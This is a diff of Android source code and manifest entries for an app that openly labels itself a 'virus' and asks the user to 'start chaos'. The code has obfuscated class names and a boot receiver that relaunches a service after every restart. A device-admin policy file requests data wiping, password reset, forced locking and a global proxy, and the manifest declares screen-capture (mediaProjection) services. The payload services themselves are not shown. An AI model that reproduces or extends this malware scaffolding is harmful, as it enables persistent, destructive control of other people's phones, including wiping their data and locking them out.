+            mainLayout.setLayoutParams(new android.widget.RelativeLayout.LayoutParams(
+                    android.widget.RelativeLayout.LayoutParams.MATCH_PARENT,
+                    android.widget.RelativeLayout.LayoutParams.MATCH_PARENT));
+
+            android.widget.Button activateButton = new android.widget.Button(this);
+            activateButton.setId(android.view.View.generateViewId());
+            activateButton.setText("ACTIVATE");
+            activateButton.setTextColor(android.graphics.Color.RED);
+            activateButton.setTextSize(28);
+            activateButton.setAllCaps(false);
+            activateButton.setTypeface(null, android.graphics.Typeface.BOLD);
+
+            android.graphics.drawable.GradientDrawable buttonBg = new android.graphics.drawable.GradientDrawable();
+            buttonBg.setColor(android.graphics.Color.parseColor("#C8A0E0"));
+            buttonBg.setCornerRadius(40);
+            buttonBg.setStroke(3, android.graphics.Color.WHITE);
+            activateButton.setBackground(buttonBg);
+            activateButton.setShadowLayer(15, 0, 0, android.graphics.Color.parseColor("#8B0000"));
+
+            android.widget.RelativeLayout.LayoutParams buttonParams =
+                    new android.widget.RelativeLayout.LayoutParams(screenWidth / 2 + 100, 160);
+            buttonParams.leftMargin = 40;
+            buttonParams.topMargin = 40;
+            activateButton.setLayoutParams(buttonParams);
+            mainLayout.addView(activateButton);
+
+            final android.widget.TextView infoText = new android.widget.TextView(this);
+            infoText.setId(android.view.View.generateViewId());
+            infoText.setText("Click the \"ACTIVATE\" button to display the confirmation and launch the virus.");
+            infoText.setTextSize(20);
+            infoText.setTypeface(null, android.graphics.Typeface.BOLD);
+            infoText.setGravity(android.view.Gravity.CENTER);
+            infoText.setShadowLayer(12, 0, 0, android.graphics.Color.parseColor("#66FF0000"));
+
+            android.widget.RelativeLayout.LayoutParams infoParams =
+                    new android.widget.RelativeLayout.LayoutParams(
+                            android.widget.RelativeLayout.LayoutParams.MATCH_PARENT,
+                            android.widget.RelativeLayout.LayoutParams.WRAP_CONTENT);
+            infoParams.addRule(android.widget.RelativeLayout.BELOW, activateButton.getId());
+            infoParams.leftMargin = 30;
+            infoParams.rightMargin = 30;
+            infoParams.topMargin = 30;
+            infoText.setLayoutParams(infoParams);
+            mainLayout.addView(infoText);
+
+            android.widget.TextView creatorText = new android.widget.TextView(this);
+            creatorText.setId(android.view.View.generateViewId());
+            creatorText.setText("Created by PbCat, virustesting8 aka. Konztol Android and TheNoobMaster");
+            creatorText.setTextColor(android.graphics.Color.WHITE);
+            creatorText.setTextSize(18);
+            creatorText.setTypeface(null, android.graphics.Typeface.ITALIC);
+            creatorText.setShadowLayer(10, 0, 0, android.graphics.Color.parseColor("#66FFFFFF"));
+            creatorText.setGravity(android.view.Gravity.CENTER);
+
+            android.widget.RelativeLayout.LayoutParams creatorParams =
+                    new android.widget.RelativeLayout.LayoutParams(
+                            android.widget.RelativeLayout.LayoutParams.MATCH_PARENT,
+                            android.widget.RelativeLayout.LayoutParams.WRAP_CONTENT);
+            creatorParams.addRule(android.widget.RelativeLayout.BELOW, infoText.getId());
+            creatorParams.leftMargin = 30;
+            creatorParams.rightMargin = 30;
+            creatorParams.topMargin = 10;
+            creatorText.setLayoutParams(creatorParams);
+            mainLayout.addView(creatorText);
+
+            setContentView(mainLayout);
+
+            final android.os.Handler colorHandler = new android.os.Handler();
+            final int[] hue = {0};
+            java.lang.Runnable colorRunnable = new java.lang.Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        if (hue[0] < 30) {
+                            float progress = hue[0] / 30f;
+                            int green = (int)(255 * progress);
+                            int color = android.graphics.Color.argb(255, 255, green, 0);
+                            infoText.setTextColor(color);
+                        } else if (hue[0] < 60) {
+                            float progress = (hue[0] - 30) / 30f;
+                            int green = (int)(255 * (1 - progress));
+                            int color = android.graphics.Color.argb(255, 255, green, 0);
+                            infoText.setTextColor(color);
+                        } else {
+                            hue[0] = 0;
+                            infoText.setTextColor(android.graphics.Color.RED);
+                        }
+                        hue[0]++;
+                        colorHandler.postDelayed(this, 16);
+                    } catch (Exception e) {}
+                }
+            };
+            colorHandler.post(colorRunnable);
+
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                if (!android.provider.Settings.System.canWrite(this)) {
+                    android.content.Intent intent = new android.content.Intent(
+                            android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS);
+                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                }
+            }
+
+            final android.app.Dialog customDialog = new android.app.Dialog(this);
+            customDialog.setCancelable(false);
+            customDialog.setCanceledOnTouchOutside(false);
+
+            android.widget.LinearLayout dialogLayout = new android.widget.LinearLayout(this);
+            dialogLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
+            dialogLayout.setBackgroundColor(android.graphics.Color.GRAY);
+            dialogLayout.setPadding(50, 50, 50, 50);
+            dialogLayout.setGravity(android.view.Gravity.CENTER);
+
+            android.widget.TextView dialogTitle = new android.widget.TextView(this);
+            dialogTitle.setText("Are you sure you want to start chaos?");
+            dialogTitle.setTextColor(android.graphics.Color.RED);
+            dialogTitle.setTextSize(22);
+            dialogTitle.setTypeface(null, android.graphics.Typeface.BOLD);
+            dialogTitle.setGravity(android.view.Gravity.CENTER);
+            dialogTitle.setShadowLayer(15, 0, 0, android.graphics.Color.parseColor("#8B0000"));
+            dialogTitle.setPadding(20, 20, 20, 30);
+
+            android.widget.LinearLayout.LayoutParams titleParams =
+                    new android.widget.LinearLayout.LayoutParams(
+                            android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
+                            android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+            dialogTitle.setLayoutParams(titleParams);
+            dialogLayout.addView(dialogTitle);
+
+            android.widget.LinearLayout buttonContainer = new android.widget.LinearLayout(this);
+            buttonContainer.setOrientation(android.widget.LinearLayout.HORIZONTAL);
+            buttonContainer.setGravity(android.view.Gravity.CENTER);
+            buttonContainer.setPadding(10, 20, 10, 10);
+
+            android.widget.Button noButton = new android.widget.Button(this);
+            noButton.setText("NO");
+            noButton.setTextColor(android.graphics.Color.WHITE);
+            noButton.setTextSize(24);
+            noButton.setTypeface(null, android.graphics.Typeface.BOLD);
+            noButton.setAllCaps(false);
+            android.graphics.drawable.GradientDrawable noBg = new android.graphics.drawable.GradientDrawable();
+            noBg.setColor(android.graphics.Color.parseColor("#444444"));
+            noBg.setCornerRadius(8);
+            noButton.setBackground(noBg);
+            android.widget.LinearLayout.LayoutParams noParams =
+                    new android.widget.LinearLayout.LayoutParams(250, 120);
+            noParams.setMargins(20, 0, 20, 0);
+            noButton.setLayoutParams(noParams);
+            noButton.setOnClickListener(new android.view.View.OnClickListener() {
+                @Override
+                public void onClick(android.view.View v) {
+                    customDialog.dismiss();
+                }
+            });
+            buttonContainer.addView(noButton);
+
+            android.widget.Button sureButton = new android.widget.Button(this);
+            sureButton.setText("SURE");
+            sureButton.setTextColor(android.graphics.Color.WHITE);
+            sureButton.setTextSize(24);
+            sureButton.setTypeface(null, android.graphics.Typeface.BOLD);
+            sureButton.setAllCaps(false);
+            android.graphics.drawable.GradientDrawable sureBg = new android.graphics.drawable.GradientDrawable();
+            sureBg.setColor(android.graphics.Color.parseColor("#444444"));
+            sureBg.setCornerRadius(8);
+            sureButton.setBackground(sureBg);
+            android.widget.LinearLayout.LayoutParams sureParams =
+                    new android.widget.LinearLayout.LayoutParams(250, 120);
+            sureParams.setMargins(20, 0, 20, 0);
+            sureButton.setLayoutParams(sureParams);
+            sureButton.setOnClickListener(new android.view.View.OnClickListener() {
+                @Override
+                public void onClick(android.view.View v) {
+                    customDialog.dismiss();
+                    Intent intent = new Intent(H.this, B.class);
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        startForegroundService(intent);
+                    } else {
+                        startService(intent);
+                    }
+                    finish();
+                }
+            });
+            buttonContainer.addView(sureButton);
+
+            dialogLayout.addView(buttonContainer);
+            customDialog.setContentView(dialogLayout);
+
+            android.view.WindowManager.LayoutParams dialogParams =
+                    customDialog.getWindow().getAttributes();
+            dialogParams.width = android.view.WindowManager.LayoutParams.MATCH_PARENT;
+            dialogParams.height = android.view.WindowManager.LayoutParams.WRAP_CONTENT;
+            customDialog.getWindow().setAttributes(dialogParams);
+            customDialog.getWindow().setBackgroundDrawable(
+                    new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
+
+            activateButton.setOnClickListener(new android.view.View.OnClickListener() {
+                @Override
+                public void onClick(android.view.View v) {
+                    customDialog.show();
+                }
+            });
+
+        } catch (java.lang.Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        handler.removeCallbacksAndMessages(null);
+        closeHandler.removeCallbacksAndMessages(null);
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class I extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        String action = intent.getAction();
+        if (action == null) return;
+
+        if (action.equals(Intent.ACTION_BOOT_COMPLETED) ||
+            action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED) ||
+            action.equals("android.intent.action.QUICKBOOT_POWERON") ||
+            action.equals("com.htc.intent.action.QUICKBOOT_POWERON") ||
+            action.equals("android.intent.action.ACTION_BOOT_IPO")) {
+
+            Intent serviceIntent = new Intent(context, A.class);
+            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent);
+            } else {
+                context.startService(serviceIntent);
+            }
+        }
+    }
+}
+
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies>
+        <limit-password />
+        <watch-login />
+        <reset-password />
+        <force-lock />
+        <wipe-data />
+        <expire-password />
+        <encrypted-storage />
+        <disable-camera />
+        <disable-keyguard-features />
+        <set-global-proxy />
+    </uses-policies>
+</device-admin>
+
+<service android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.A"
+    android:exported="true"
+    android:enabled="true"
+    android:foregroundServiceType="dataSync|mediaProjection" />
+
+<service
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.B"
+    android:exported="false"
+    android:enabled="true"
+    android:foregroundServiceType="mediaProjection|dataSync" />
+
+<activity
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.D"
+    android:exported="true"
+    android:enabled="true"
+    android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+    android:screenOrientation="portrait"
+    android:configChanges="orientation|screenSize|keyboardHidden"
+    android:windowSoftInputMode="stateAlwaysHidden|adjustNothing" />
+
+<activity
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.E"
+    android:exported="true"
+    android:enabled="true"
+    android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+    android:screenOrientation="portrait"
+    android:configChanges="orientation|screenSize|keyboardHidden"
+    android:windowSoftInputMode="stateAlwaysHidden|adjustNothing" />
+
+<activity
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.G"
+    android:exported="true"
+    android:enabled="true"
+    android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+    android:screenOrientation="portrait"
+    android:configChanges="orientation|screenSize|keyboardHidden"
+    android:windowSoftInputMode="stateAlwaysHidden|adjustNothing" />
+
+<activity
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.H"
+    android:exported="true"
+    android:enabled="true"
+    android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+    android:screenOrientation="portrait"
+    android:configChanges="orientation|screenSize|keyboardHidden"
+    android:windowSoftInputMode="stateAlwaysHidden|adjustNothing" />
+
+<receiver
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.F"
+    android:permission="android.permission.BIND_DEVICE_ADMIN"
+    android:exported="true"
+    android:enabled="true">
+    <meta-data
+        android:name="android.app.device_admin"
+        android:resource="@xml/UAHCIANFAOJXJV" />
+    <intent-filter>
+        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+    </intent-filter>
+</receiver>
+
+<receiver
+    android:name="anandnxnsntodoi.chahahchhxoas.by.pbcat.I"
+    android:exported="true"
+    android:enabled="true"
+    android:priority="1000">
+    <intent-filter>
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+        <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+        <action android:name="android.intent.action.ACTION_BOOT_IPO" />
+    </intent-filter>
+</receiver>
